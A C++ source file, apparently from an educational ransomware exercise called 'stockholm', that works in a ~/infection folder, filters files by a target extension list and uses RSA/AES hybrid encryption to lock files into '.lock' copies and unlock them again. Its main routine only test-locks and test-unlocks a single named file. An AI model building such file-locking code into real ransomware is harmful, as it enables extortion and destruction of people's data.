#include "Crawler.hpp"
#include "stockholm.hpp"
#include <fstream>
#include <iostream>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <cstring>
#include <unistd.h>
#include "log.hpp"
#include "rsa.hpp"
#include "sha.hpp"

inline bool filter_extensions(std::string path)
{
	for (size_t i = 0; i < stockholm::extensions_count; ++i)
	{
		if (path.ends_with(stockholm::extensions[i]))
			return true;
	}
	return false;
}

static fs::path getHomeDir()
{
	char *envHome = std::getenv("HOME");
	std::string homedir = envHome ? envHome : "";
	if (homedir.empty())
	{
		std::string username;
		char *envUser = std::getenv("USER");
		if (!envUser)
		{
			long nameMax = sysconf(_SC_LOGIN_NAME_MAX);
			char *buf = new char[nameMax];
			if (getlogin_r(buf, nameMax))
			{
				log("Failed to fetch username");
				delete[] buf;
				return std::string();
			}
			username = buf;
			delete[] buf;
		}
		else
			username = envUser;
		homedir = "/home/" + username;
	}
	return fs::path{homedir};
}

void LockFile(fs::path keyfile, fs::path file)
{
	FILE *fp = fopen(file.c_str(), "rb");
	BIO *in = BIO_new(BIO_s_mem());
	if (!in)
	{
		LogOpenSSLError();
		return;
	}
	char buf[1024];
	size_t len;
	do
	{
		len = fread(buf, sizeof(char), 1024, fp);
		BIO_write(in, buf, len);
	} while (len > 0);

	BIO *out = BIO_new_file(file.string().append(".lock").c_str(), "wb");
	if (!out)
	{
		BIO_free(in);
		LogOpenSSLError();
		return;
	}
	rsa_aes_hybrid_encryption(keyfile.c_str(), in, out);
	BIO_free(in);
	BIO_free(out);
}

void UnlockFile(fs::path keyfile, fs::path file)
{

	BIO *in = BIO_new_file(file.c_str(), "rb");
	if (!in)
	{
		LogOpenSSLError();
		return;
	}
	BIO *out = BIO_new_file(file.replace_extension(".unlock").c_str(), "wb");
	if (!out)
	{
		BIO_free(in);
		LogOpenSSLError();
		return;
	}
	stockholm::header hdr;
	rsa_aes_hybrid_decryption(keyfile.c_str(), &hdr, in, out);

	BIO_free(in);
	BIO_free(out);
}

int main(int argc, char **argv)
{
	if (argc == 1)
		return (1);
	char *cwd = getcwd(NULL, 0);
	if (!cwd)
		return (1);
	fs::path startupCwd = cwd;
	free(cwd);
	fs::path homeDir = getHomeDir();
	if (homeDir.empty())
	{
		log("empty path for Home directory");
		return (1);
	}
	fs::path infectionDir = homeDir / "infection";
	if (chdir(infectionDir.c_str()))
	{
		log(strerror(errno));
		return (1);
	}

	if (!create_local_rsa_id((startupCwd / "public.pem").c_str()))
		return (1);
	fs::path target = fs::path(argv[1]);
	fs::path lTarget = fs::path().assign(target).string().append(".lock");
	LockFile(startupCwd / "public.pem", target);
	UnlockFile(startupCwd / "private.pem", lTarget);
}
